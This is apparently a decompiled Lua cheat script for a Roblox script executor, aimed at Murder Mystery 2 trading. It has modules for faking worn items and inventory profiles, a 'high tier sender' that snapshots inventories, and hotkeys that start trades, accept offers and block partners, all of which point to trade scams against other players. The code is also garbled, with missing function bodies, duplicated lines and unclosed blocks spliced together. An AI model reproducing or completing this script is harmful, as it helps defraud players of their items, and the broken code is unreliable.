						v1198:SetAttribute("ItemType", tostring(v1189.Meta.ItemType))
					end
				end)
				v881(p250, v1198, "pinned MM2 mesh database :: " .. tostring(v1188))
				pcall(function()
					v1198:Destroy()
				end)

				local v1200 = mM2VisualParser.models[p250]

				if v1200 and v1200.instance and v1200.instance.Parent and v1094(v1200.instance) then
					print(("[mm2run/mesh-db] built %s from exact row %s"):format(tostring(p250), tostring(v1188)))

					return v1200.instance
				end

				return nil
			end

			mM2VisualParser.TryLoadExternalReplacement = function(p251)
				if mM2VisualParser.externalModelAttempts[p251] then
					return nil
				end

				mM2VisualParser.externalModelAttempts[p251] = true
				v1106()

				local v1201 = v865(p251, Weapons[p251])

				if v1201 then
					local ok, result = pcall(function()
						return game:GetObjects("rbxassetid://" .. tostring(v1201))
					end)

					if ok and type(result) == "table" then
						for _, v in ipairs(result) do
							v881(p251, v, "Creator Store exact model " .. tostring(v1201))
						end

						local v1206 = mM2VisualParser.models[p251]

						if v1206 and v1206.instance and v1094(v1206.instance) then
							print(("[mm2run/fake-wear] loaded exact %s model %s"):format(tostring(p251), tostring(v1201)))

							if mM2VisualParser.snapshots[p251] then
								for _, v in ipairs(result) do
									pcall(function()
										v:Destroy()
									end)
								end
							else
								for _, v in ipairs(result) do
									table.insert(mM2VisualParser.externalObjects, v)
								end
							end

							return v1206.instance
						end

						for _, v in ipairs(result) do
							pcall(function()
								v:Destroy()
							end)
						end

						print(("[mm2run/fake-wear] model %s has no usable 3D parts for %s"):format(tostring(v1201), tostring(p251)))
					else
						print(("[mm2run/fake-wear] couldn't load exact model %s for %s"):format(tostring(v1201), tostring(p251)))
					end
				end

				for _, v in ipairs(t82) do
					local ok, result = pcall(function()
						return game:GetObjects("rbxassetid://" .. tostring(v))
					end)

					if not (ok and type(result) == "table") then
						print(("[mm2run/fake-wear] couldn't load MM2 pack %s"):format(tostring(v)))

						continue
					end

					for _, v2 in ipairs(result) do
						if mM2VisualParser.FindKeyForInstance(v2) == p251 then
							v881(p251, v2, "Creator Store MM2 pack " .. tostring(v))
						end

						if not (mM2VisualParser.models[p251] and mM2VisualParser.models[p251].instance) then
							for _, descendant in ipairs(v2:GetDescendants()) do

		local function v1735(p364)
			if type(p364) ~= "table" then
				return false
			end

			if p364.Tradable == false or p364.CanTrade == false then
				return false
			end

			if p364.Untradable == true or p364.NonTradable == true then
				return false

				return false
			end

			return true

		local function v1736(p365)
			if t133.rebuilding then
				t133.pending = true

				return
			end

			t133.rebuilding = true
			task.spawn(function()
				repeat
					t133.pending = false

					local regular = {}
					local small = {}

					for i, v in ipairs(t53) do
						local v1741 = Weapons[v.key]
						local v1742 = v.chroma and "Chroma"

						if not v1742 then
							v1742 = tostring(v.rarity or v1741 and v1741.Rarity or "")
						end

						if t132[v1742] and v1735(v1741) and type(v1293) == "function" then
							local v1743, v1744, v1745 = v1293(v.key)
							local v1746 = tonumber(v1743) or 0

							if v1746 >= t131.minValue and v1746 <= t131.maxValue then
								local t134 = {
									key = v.key,
									name = v.name or v1745 or v.key,
									value = v1746,
									source = v1744,
									rarity = v1742,
									type = v.type
								}

								table.insert(regular, t134)

								if v1746 <= t131.smallMaxValue then
									table.insert(small, t134)
								end
							end
						end

						if i % 40 == 0 then
							task.wait()
						end
					end

					table.sort(regular, function(p366, p367)
						if p366.value == p367.value then
							return tostring(p366.name) < tostring(p367.name)
						end

						return p366.value > p367.value
					end)
					table.sort(small, function(p368, p369)
						if p368.value == p369.value then
							return tostring(p368.name) < tostring(p369.name)
						end

						return p368.value > p369.value
					end)
					t133.regular = regular
					t133.small = small
					t133.reason = tostring(p365 or "refresh")
					print(("[mm2run/random] pools ready: regular=%d [%s-%s], small=%d [%s-%s] (%s)"):format(#regular, v606(t131.minValue), v606(t131.maxValue), #small, v606(t131.minValue), v606(t131.smallMaxValue), t133.reason))
				until not t133.pending

				t133.rebuilding = false
			end)
		end

			local function v1928(p400, p401)
				if not p400 then
					return 0, {}
				end

				local t156 = {}

				if p401 then
					print(("[mm2run] ----- %s: %d inventory items -----"):format(p401, #p400))
				end

				local n43 = 0
				local n44 = 0

				for _, v in ipairs(p400) do
					local v1934 = t52[v604(v.Name)]
					local v1935 = t54[v.Name]
					local v1936

					if v1935 then
						v1936 = v1935
					else
						v1936 = t55[string.lower(tostring(v.Name or ""))]
					end

					if v1936 and type(v1293) == "function" then
						local v1937, v1938, v1939 = v1293(v1936.key)

						if tonumber(v1937) and tonumber(v1937) >= 50 then
							v1934 = {
								name = v1939 or v1936.name or v.Name,
								value = tonumber(v1937),
								source = v1938
							}
						end
					end

					if v1934 and v1934.value >= 50 and (not v.Rarity or t155[v.Rarity]) then
						local Amount = v.Amount or 1
						local v1941 = v1934.value * Amount

						n43 += v1941
						table.insert(t156, {
							name = v1934.name,
							amount = Amount,
							value = v1934.value
						})

						if p401 then
							print(("[mm2run]   [+] %s x%d  =  %s  (each %s)"):format(v1934.name, Amount, v606(v1941), v606(v1934.value)))
						end
					else
						n44 += 1

						if p401 then
							local v1942

							if v1934 then
								v1942 = "wrong rarity: " .. tostring(v.Rarity)
							else
								v1942 = "not in price table"
							end

							print(("[mm2run]   [-] %s x%d  (%s)"):format(tostring(v.Name), v.Amount or 1, v1942))
						end
					end
				end

				if p401 then
					print(("[mm2run] ----- %s TOTAL: %s  (%d counted, %d ignored) -----"):format(p401, v606(n43), #t156, n44))
				end

				table.sort(t156, function(p402, p403)
					return p402.value * p402.amount > p403.value * p403.amount
				end)

				return n43, t156
			end

			local request_ = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

			local function v1988(p410, p411)

			local function v1995(p412)
				if request_ then
					local v1996, v1997 = v1988(function()
						return request_({
							Url = p412,
							Method = "GET",
							Headers = {
								Accept = "*/*",
								Referer = "https://mm2.cosmicvalues.gg/calculator",
								["User-Agent"] = "Mozilla/5.0"
							}
						})
					end, 8)

					if v1996 == "ok" and v1997 and v1997.Body then
						local ok, result = pcall(HttpService.JSONDecode, HttpService, v1997.Body)

						if ok then
							return result
						end

						warn("[mm2run/http] JSON decode failed for " .. p412)
					elseif v1996 == "timeout" then
						warn("[mm2run/http] httpRequest TIMED OUT after 8s for " .. p412)
					elseif v1996 == "err" then
						warn("[mm2run/http] httpRequest errored: " .. tostring(v1997))
					end
				end

				local v2000, v2001 = v1988(function()
					return game:HttpGet(p412)
				end, 8)

				if v2000 == "ok" and v2001 then
					local ok, result = pcall(HttpService.JSONDecode, HttpService, v2001)

					if ok then
						return result
					end

					warn("[mm2run/http] JSON decode failed on HttpGet fallback for " .. p412)
				elseif v2000 == "timeout" then
					warn("[mm2run/http] HttpGet TIMED OUT after 8s for " .. p412)
				elseif v2000 == "err" then
					warn("[mm2run/http] HttpGet errored: " .. tostring(v2001))
				end

				return nil
			end
			local function v2004(p413, p414, p415)
				p413 = p413 or 1

			local function v2006(p416)
				local cache = {}
				local n46 = 1

				repeat
					print(("[mm2run/catalog] fetching page %d (have %d items)"):format(n46, #cache))

					local v2009 = v2004(n46, 100, nil)

					if not v2009 or not v2009.items then
						print(("[mm2run/catalog] page %d failed, retrying once"):format(n46))
						task.wait(0.5)

						local v2010 = v2004(n46, 100, nil)

						if not v2010 or not v2010.items then
							print(("[mm2run/catalog] page %d failed twice, returning partial (%d items)"):format(n46, #cache))

							return cache, false
						end

						v2009 = v2010
					end

					for _, item in ipairs(v2009.items) do
						item._numericValue = tonumber(item.value) or 0
						table.insert(cache, item)
					end

					if t51 then
						t51.cache = cache

						if type(v605) == "function" then
							v605()
						end
					end

					local hasMore = v2009.pagination and v2009.pagination.hasMore

					if p416 then
						p416(#cache, hasMore)
					end

					if not hasMore then
						break
					end

					n46 += 1
				until n46 > 100

				return cache, true
			end

			v605 = function()
				t51.byName = {}

				end

				local function v2014(p417)
					if p417 then
						p417 = p417._numericValue or p417.value

					local v2015 = p417 or 0

					if type(v2015) == "number" then

			local function v2043(p422)
				if not t51.cache then
					return nil

			local function v2050(p423)
				local v2051 = v2043(p423)

			local function v2056(p424)
				if not t51.cache then
					return

			local function v2059(p425)

		do
			local GuiService = game:GetService("GuiService")

				Gui = ScreenGui,

			local t162 = {
				maxTapDuration = 0.25,
				doubleTapInterval = 0.42,
				maxMovement = 20,
				maxTapDistance = 44,
				repeatDelay = 0.4,
				minZoneSize = 96,
				maxZoneSize = 140

			local n47 = 0
			local u2067
			local u2068
			local n48 = 0

			local function v2070(p428, p429)

				t163 = {}
				n47 = 0
				u2067 = nil
				u2068 = nil
				n48 = 0

					return

			local function v2078()
				if mM2MenuInputController.destroyed or not ScreenGui.Parent then
					return false
				end

				if UserInputService:GetFocusedTextBox() then
					return false
				end

				local u2079 = false

					u2079 = GuiService.MenuIsOpen == true
				end)

				return not u2079
			end
			local function v2080(p431)
				if not workspace.CurrentCamera then
					return nil
				end

				local ViewportSize = workspace.CurrentCamera.ViewportSize

				if ViewportSize.X <= 0 or ViewportSize.Y <= 0 then
					return nil
				end

				local n49 = 0
				local n50 = 0

				pcall(function()
					local guiInset, v2085 = GuiService:GetGuiInset()

					n49 = math.max(0, guiInset.Y)
					n50 = math.max(0, v2085.X)
				end)

				local v2086 = math.max(t162.minZoneSize, math.min(t162.maxZoneSize, math.min(ViewportSize.X, ViewportSize.Y) * 0.14))
				local v2087 = ViewportSize.X - n50 - 12
				local v2088 = math.max(12, n49 + 8)
				local v2089 = math.min(ViewportSize.Y - 12, v2088 + v2086)

				if p431.X < v2087 - v2086 or p431.X > v2087 or p431.Y < v2088 or p431.Y > v2089 then
					return nil
				end

				return ViewportSize
			end
			local function v2090(p432, p433)
				local v2091 = p432.X - p433.X
				local v2092 = p432.Y - p433.Y

				return v2091 * v2091 + v2092 * v2092
			end

			v2070(UserInputService.TouchStarted, function(p434)
				if mM2MenuInputController.destroyed or t163[p434] then
					return
				end

				t163[p434] = true

				if n47 ~= 1 or not v2078() or os.clock() < n48 then
					u2067 = nil
					u2068 = nil

					return
				end

				local v2093 = v2080(p434.Position)

				if not v2093 then
					u2067 = nil
					u2068 = nil

					return
				end

				u2067 = {
					input = p434,
					position = Vector2.new(p434.Position.X, p434.Position.Y),
					startedAt = os.clock(),
					viewportX = v2093.X,
					viewportY = v2093.Y,
					moved = false
				}
			end)
			v2070(UserInputService.TouchMoved, function(p435)
				if u2067 and u2067.input == p435 and v2090(p435.Position, u2067.position) > t162.maxMovement * t162.maxMovement then
					u2067.moved = true
				end
			end)
			v2070(UserInputService.TouchEnded, function(p436)
				if not t163[p436] then
					return
				end

				t163[p436] = nil
				n47 = math.max(0, n47 - 1)

				local v2094 = u2067

				if not v2094 or v2094.input ~= p436 then
					return
				end

				u2067 = nil

				local now = os.clock()
				local v2096 = v2080(p436.Position)

				if not v2078() or n47 ~= 0 or not v2096 or v2094.moved or p436.UserInputState == Enum.UserInputState.Cancel or now - v2094.startedAt > t162.maxTapDuration or v2090(p436.Position, v2094.position) > t162.maxMovement * t162.maxMovement or v2096.X ~= v2094.viewportX or v2096.Y ~= v2094.viewportY then
					u2068 = nil

					return
				end

				if u2068 and now - u2068.time <= t162.doubleTapInterval and v2096.X == u2068.viewportX and v2096.Y == u2068.viewportY and v2090(p436.Position, u2068.position) <= t162.maxTapDistance * t162.maxTapDistance then
					u2068 = nil
					n48 = now + t162.repeatDelay
					v2075("top-right double-tap")
				else
					u2068 = {
						time = now,
						position = Vector2.new(p436.Position.X, p436.Position.Y),
						viewportX = v2096.X,
						viewportY = v2096.Y
					}
				end
			end)
			v2070(UserInputService.WindowFocusReleased, v2072)
			pcall(function()
				v2070(ScreenGui.Destroying, mM2MenuInputController.Destroy)
			end)
			v2070(UserInputService.InputBegan, function(p437, p438)
				if mM2MenuInputController.destroyed or p438 then
					return
				end

				local KeyCode = p437.KeyCode

				if KeyCode == Enum.KeyCode.P then
					v2072()
					v2075("P")
				elseif KeyCode == Enum.KeyCode.M then
					local ok, result = pcall(StartTrade)

					print(ok and "[mm2run] trade started (M)" or "[mm2run] start trade failed: " .. tostring(result))
				elseif KeyCode == Enum.KeyCode.N then
					local ok, result = pcall(function()
						v1749("regular")
					end)

					if not ok then
						warn("[mm2run/random] N failed: " .. tostring(result))
					end
				elseif KeyCode == Enum.KeyCode.C then
					local ok, result = pcall(function()
						v1749("small")
					end)

					if not ok then
						warn("[mm2run/random] C failed: " .. tostring(result))
					end
				elseif KeyCode == Enum.KeyCode.B then
					local ok, result = pcall(v1755)

					if ok and result then
						print("[mm2run] offer accepted (B)")
					end
				elseif KeyCode == Enum.KeyCode.V then
					local ok, result = pcall(function()
						local v2108 = Players:FindFirstChild(tostring(t56.Player2.Player or ""))

						if v2108 then
							v1797(v2108)
							print("[mm2run] block player (V): " .. v2108.Name)
						else
							print("[mm2run] no online selected player to block")
						end
					end)

					if not ok then
						warn("[mm2run] V failed: " .. tostring(result))
					end
				elseif KeyCode == Enum.KeyCode.Z then
					local ok, result = pcall(v1294)

					if not ok then
						warn("[mm2run/recent] Z failed: " .. tostring(result))
					end
				elseif KeyCode == Enum.KeyCode.Q then
					local ok, result = pcall(v1295)

					if not ok then
						warn("[mm2run/fake-wear] Q failed: " .. tostring(result))
					end
				end
			end)
			_G.MM2MenuInputController = mM2MenuInputController
		end

		print("[mm2run] Hotkeys: P=GUI | M=Trade | N=Random 50-20k | C=Small 50-500 | B=Accept | V=Block | Z=Recent | Q=Wear")
		print("[mm2run] iPad/mobile: double-tap the TOP-RIGHT game corner below the top bar to hide/show the menu")
		_G.MM2FakeProfile = {
			Add = v622,
			Get = v623,
			Merge = v624,
			Data = t57,
			RandomPools = t133,
			RandomConfig = t131,
			Partners = t130
		}
		print("[mm2run/fake-profile] ready: _G.MM2FakeProfile.Add(playerName, itemKey, amount, itemType)")
	end
}
local genv = type(getgenv) == "function" and getgenv() or _G

if genv.MM2AllThreeSnapshotLoaded or genv.MM2HighTierSender or _G.MM2FakeProfile or _G.MM2MenuInputController then
	warn("[Launcher] Already loaded or inventory modified. Rejoin before launching this file.")

	return
end

genv.MM2AllThreeSnapshotLoaded = true

local function v2114(p439)
	local ok, result = xpcall(t1[p439], function(p440)
		return tostring(p440)
	end)

	if not ok then
		warn("[Launcher] Module " .. p439 .. ": " .. tostring(result))
	end

	return ok, result
end

task.spawn(function()
	local v2117, v2118 = v2114(2)

	if not v2117 or type(v2118) ~= "table" then
		return
	end

	while true do
		local enabled = v2118.enabled

		if enabled then
			enabled = not (v2118.log and v2118.log.startupSnapshot)
		end

		if enabled then
			task.wait(0.2)

			continue
		end

		break
	end

	if not (v2118.log and v2118.log.startupSnapshot) then
		warn("[Launcher] Sender stopped before startup inventory was captured.")

		return
	end

	task.spawn(function()
		v2114(1)
	end)
	task.wait(0.5)
	v2114(3)
end)
